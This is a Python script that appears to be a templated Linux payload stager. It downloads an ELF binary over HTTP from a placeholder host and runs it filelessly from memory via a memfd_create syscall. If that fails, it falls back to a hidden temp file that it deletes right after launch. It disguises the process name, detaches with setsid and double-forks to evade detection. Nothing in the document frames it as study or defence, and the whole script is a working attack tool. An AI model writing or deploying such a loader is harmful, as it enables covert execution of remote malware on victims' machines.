#!/usr/bin/env python3
import os
import ctypes
import http.client
import random
import string
import time
import sys
import tempfile

class SyscallExecutor:
    SYSCALL_MAP = {
        'x86_64': 319,  # x86_64
        'i386': 356,    # x86
        'arm': 385,     # ARM
        'aarch64': 279  # ARM64
    }
    
    def __init__(self):
        import platform
        arch = platform.machine()
        self.SYS_memfd_create = self.SYSCALL_MAP.get(arch, 319)  # Default to x86_64
        self.MFD_ALLOW_SEALING = 2
        self.libc = ctypes.CDLL("libc.so.6")
        self.syscall = self.libc.syscall
    
    def create_memfd(self, name):
        return self.syscall(self.SYS_memfd_create, name.encode(), self.MFD_ALLOW_SEALING)

class PayloadFetcher:
    @staticmethod
    def fetch(host, path, timeout=10, retries=2):
        for attempt in range(retries + 1):
            conn = None
            try:
                conn = http.client.HTTPConnection(host, timeout=timeout)
                conn.request('GET', path, headers={'X-Request-Type': 'binary'})
                response = conn.getresponse()
                if response.status != 200:
                    if attempt >= retries:
                        sys.exit(f"Download failed: HTTP {response.status}")
                    continue
                return response.read()
            except (http.client.HTTPException, ConnectionError) as e:
                if attempt >= retries:
                    sys.exit(f"Download failed after {retries} attempts: {e}")
                time.sleep(1)  # Wait before retry
            finally:
                if conn:
                    conn.close()

class DirectExecutor:
    @staticmethod
    def _random_name():
        return ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    
    @staticmethod
    def execute_temp(payload, proc_name=None, args=[]):
        """Write payload to a temporary file and delete after execution."""
        if proc_name is None:
            proc_name = DirectExecutor._random_name()
            
        try:
            with tempfile.NamedTemporaryFile(prefix=f".{proc_name}-", delete=False) as temp_file:
                temp_path = temp_file.name
                temp_file.write(payload)
            
            os.chmod(temp_path, 0o755)
            
            pid = os.fork()
            if pid == 0:  # Child process
                try:
                    os.setsid()
                    os.execv(temp_path, [proc_name] + args)
                except Exception as e:
                    print(f"Execution failed: {e}", file=sys.stderr)
                    os._exit(1)
            else:
                time.sleep(0.5)
                try:
                    os.unlink(temp_path)
                except OSError:
                    pass
                return True
        except Exception as e:
            print(f"Error: {e}", file=sys.stderr)
            return False

    @staticmethod
    def execute_memfd(payload, proc_name=None, args=[]):
        """Execute directly from memory using memfd_create."""
        if proc_name is None:
            proc_name = DirectExecutor._random_name()
            
        try:
            executor = SyscallExecutor()
            fd = executor.create_memfd(proc_name)
            
            if fd == -1:
                raise OSError("Failed to create memory file descriptor")
            
            os.write(fd, payload)
            fd_path = f"/dev/fd/{fd}"
            pid = os.fork()
            if pid == 0:  # Child process
                try:
                    os.setsid()
                    second_pid = os.fork()
                    if second_pid == 0:
                        os.execv(fd_path, [proc_name] + args)
                    else:
                        os._exit(0)
                except Exception:
                    os._exit(1)
            else:
                time.sleep(0.5)
                os.close(fd)
                return True
                
        except Exception as e:
            print(f"Error: {e}", file=sys.stderr)
            return False

def main():
    host = '${HOST}'
    path = '${PATH}'
    args = '${ARGS}'
    
    try:
        payload = PayloadFetcher.fetch(host=host, path=path)
        
        if payload[:4] != b'\x7fELF':
            print(f"Error: Downloaded payload is not a valid ELF executable", file=sys.stderr)
            return 1
        
        proc_name = path.split('/')[-1]
        
        try:
            success = DirectExecutor.execute_memfd(payload=payload, proc_name=proc_name, args=args.split())
        except Exception:
            success = DirectExecutor.execute_temp(payload=payload, proc_name=proc_name, args=args.split())
                
        return 0 if success else 1
        
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        return 1

if __name__ == "__main__":
    sys.exit(main())
